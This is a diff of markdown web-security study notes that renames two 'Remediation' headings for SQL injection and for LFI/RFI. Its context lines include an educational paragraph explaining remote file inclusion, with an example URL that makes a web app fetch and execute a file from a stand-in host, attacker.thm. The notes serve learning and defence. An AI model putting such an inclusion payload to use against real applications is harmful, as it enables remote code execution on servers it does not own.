@@ -20,7 +20,7 @@
   - [Blind SQLi Boolean Based](#Blind-SQLi-Boolean-Based)
   - [Blind SQLi Time Based](#Blind-SQLi-Time-Based)
   - [Out of Band SQLi](#Out-of-Band-SQLi)
-  - [Remediation](#Remediation)
+  - [SQL injection Remediation](#SQL-injection-Remediation)
 - [Insecure Design](#Insecure-Design)
 - [Security Misconfiguration](#Security-Misconfiguration)
 - [Vulnerable and Outdated Components](#Vulnerable-and-Outdated-Components)
@@ -33,7 +33,7 @@
   - [Path Traversal](#Path-Traversal)
   - [Local File Inclusion LFI](#Local-File-Inclusion-LFI)
   - [Remote File Inclusion RFI](#Remote-File-Inclusion-RFI)
-  - [Remediation](#Remediation)
+  - [LFI and RFI Remediation](#LFI-and-RFI-Remediation)
 
 
 
@@ -654,9 +654,7 @@ An Out-Of-Band attack is classified by having two different communication channe
 
 ![image](https://user-images.githubusercontent.com/24814781/181909315-2aa7b7ff-92e8-4f49-81dc-6c084ae3d7a7.png)
 
-### Remediation 
-
-
+### SQL injection Remediation 
 
 Remediation
 
@@ -1176,7 +1174,7 @@ The following figure is an example of steps for a successful RFI attack! Let's s
 
 First, the attacker injects the malicious URL, which points to the attacker's server, such as http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt. If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a GET request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. In our case, the current page somewhere has to show the Hello THM message.
 
-### Remediation
+### LFI and RFI Remediation
 
 
 
